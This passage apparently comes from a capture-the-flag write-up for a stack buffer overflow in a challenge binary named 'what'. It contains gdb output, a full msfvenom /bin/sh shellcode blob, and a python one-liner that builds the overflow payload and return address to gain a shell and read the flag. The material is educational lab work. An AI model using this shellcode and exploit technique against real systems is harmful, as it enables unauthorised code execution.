=> 0x80485aa:	call   0x8048440 <__isoc99_sscanf@plt>
   0x80485af:	cmp    eax,0x2
Guessed arguments:
Guessed arguments:
arg[0]: 0xbfc62e5f --> 0x6f6f66 ('foo')
arg[1]: 0x8048814 ("%[^/]/%[^/]/")
arg[2]: 0xbfc620b0 --> 0xb77d1b58 --> 0x8048301 ("GLIBC_2.0")
arg[3]: 0xbfc62030 --> 0x8048200 --> 0x39 ('9')

# buffer overflow: 
set environment AUTH = Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9/schadenfreude

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x37654136 in ?? ()
```

On our server:
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial

root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/exec CMD="/bin/sh" -b '\x0a\x0d\x2f\x00' -f sh
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
export buf=\
$'\xbf\xd0\xe8\x51\x87\xdb\xd7\xd9\x74\x24\xf4\x5d\x31\xc9'\
$'\xb1\x0b\x31\x7d\x15\x83\xc5\x04\x03\x7d\x11\xe2\x25\x82'\
$'\x5a\xdf\x5c\x01\x3b\xb7\x73\xc5\x4a\xa0\xe3\x26\x3e\x47'\
$'\xf3\x50\xef\xf5\x9a\xce\x66\x1a\x0e\xe7\x71\xdd\xae\xf7'\
$'\xae\xbf\xc7\x99\x9f\x4c\x7f\x66\xb7\xe1\xf6\x87\xfa\x86'
```

CTF server:
```
[ctf-7119@icectf-shell /home/what]$ export buf=\
> $'\xbf\xd0\xe8\x51\x87\xdb\xd7\xd9\x74\x24\xf4\x5d\x31\xc9'\
> $'\xb1\x0b\x31\x7d\x15\x83\xc5\x04\x03\x7d\x11\xe2\x25\x82'\
> $'\x5a\xdf\x5c\x01\x3b\xb7\x73\xc5\x4a\xa0\xe3\x26\x3e\x47'\
> $'\xf3\x50\xef\xf5\x9a\xce\x66\x1a\x0e\xe7\x71\xdd\xae\xf7'\
> $'\xae\xbf\xc7\x99\x9f\x4c\x7f\x66\xb7\xe1\xf6\x87\xfa\x86'

[ctf-7119@icectf-shell /t/.sine]$ cp /home/what/what .

[ctf-7119@icectf-shell /t/.sine]$ AUTH=$(python -c 'import os; print os.environ["buf"] + "X" * (140-len(os.environ["buf"])) + "XXXX" + "/schadenfreude"') ./what ausgeschnitzel flugelfragen
Authenticating...
[1]    24497 segmentation fault (core dumped)  AUTH= ./what ausgeschnitzel flugelfragen

[ctf-7119@icectf-shell /t/.sine]$ gdb -q -ex 'q' ./what core.24497
Reading symbols from /tmp/.sine/what...(no debugging symbols found)...done.
[New LWP 24497]
Core was generated by `./what ausgeschnitzel flugelfragen'.
Program terminated with signal 11, Segmentation fault.
#0  0x58585858 in ?? ()
```

Now we only need to jump to our shellcode

```
[ctf-7119@icectf-shell /t/.sine]$ git clone https://github.com/hellman/fixenv

[ctf-7119@icectf-shell /t/.sine/fixenv]$ export AUTH=$(python -c 'import os; print os.environ["buf"] + "X" * (140-len(os.environ["buf"])) + "XXXX" + "/schadenfreude"')

[ctf-7119@icectf-shell /t/.sine/fixenv]$ ./r.sh gdb /home/what/what ausgeschnitzel flugelfragen

(gdb) b *0x0804869E
Breakpoint 1 at 0x804869e

(gdb) r
Starting program: /tmp/.sine/fixenv/.launcher
Breakpoint 1, 0x0804869e in ?? ()
Missing separate debuginfos, use: debuginfo-install glibc-2.17-78.el7.i686

(gdb) x /500s $esp
...
0xffffdd25:	"AUTH=\277\320\350Q\207\333\327\331t$\364]1\311\261\v1}\025\203\305\004\003}\021\342%\202Z\337\\\001;\267s\305J\240\343&>G\363P\357\365\232\316f\032\016\347q\335\256\367\256\277\307\231\237L\177f\267\341\366\207\372\206", 'X' <repeats 74 times>, "/schadenfreude"

(gdb) x /s 0xffffdd2a
0xffffdd2a:	"\277\320\350Q\207\333\327\331t$\364]1\311\261\v1}\025\203\305\004\003}\021\342%\202Z\337\\\001;\267s\305J\240\343&>G\363P\357\365\232\316f\032\016\347q\335\256\367\256\277\307\231\237L\177f\267\341\366\207\372\206", 'X' <repeats 70 times>, "0\335\377\377/schadenfreude"
...

[ctf-7119@icectf-shell /t/.sine/fixenv]$ export AUTH=$(python -c 'import os; import struct; print os.environ["buf"] + "X" * (140-len(os.environ["buf"])) + struct.pack("<I", 0xffffdd2a) + "/schadenfreude"')

[ctf-7119@icectf-shell /t/.sine/fixenv]$ ./r.sh /home/what/what ausgeschnitzel flugelfragen
Authenticating...

sh-4.2$ id
uid=1148(ctf-7119) gid=1102(what) groups=1002(ctf) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2$ cat /home/what/flag.txt

flag_squeamish_ossifrage
```


